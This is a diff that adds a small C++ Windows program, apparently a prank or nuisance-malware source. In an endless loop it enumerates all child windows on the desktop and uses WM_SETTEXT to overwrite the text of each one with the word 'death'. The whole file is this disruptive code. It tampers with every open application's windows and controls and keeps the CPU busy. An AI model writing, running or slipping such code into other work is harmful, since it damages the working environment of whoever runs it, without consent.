@@ -1,0 +1,16 @@
+#include <windows.h>
+
+int main()
+{
+	while (true)
+	{
+		BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
+		EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
+	}
+}
+
+BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam)
+{
+	SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)L"death", SMTO_ABORTIFHUNG, 100, NULL);
+	return true;
+}
